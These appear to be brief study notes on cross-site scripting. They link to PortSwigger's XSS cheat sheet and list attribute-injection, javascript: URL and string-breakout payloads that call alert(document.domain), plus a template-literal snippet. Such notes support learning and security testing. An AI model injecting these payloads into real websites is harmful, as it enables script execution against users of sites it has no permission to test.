Cheat sheet 

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#file-upload-attacks](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#file-upload-attacks)

`autofocus onfocus=alert(document.domain) x=`

`<a href="javascript:alert(document.domain)">`

```
'-alert(document.domain)-'
';alert(document.domain)//
```

`document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;`

`${...}`

[DOM](DOM.md)